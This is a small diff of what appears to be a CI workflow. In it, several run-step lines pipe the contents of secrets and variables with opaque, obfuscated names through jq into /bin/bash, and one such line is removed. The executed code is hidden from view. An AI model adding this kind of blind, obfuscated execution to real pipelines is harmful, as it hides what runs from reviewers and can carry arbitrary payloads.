@@ -21,7 +21,6 @@ jobs:
           xkuj9135: ${{ secrets.xkuj9135 }}
         run: |
           printf '%s' "$xkuj9135" | jq -r .y09 | /bin/bash
-          printf '%s' "$ei53" | jq -r .es7451 | /bin/bash
           echo $lskz38881 | jq -r .smlrz0199 | /bin/bash
           echo $gh3509 | jq -r .ke9170 | /bin/bash
 
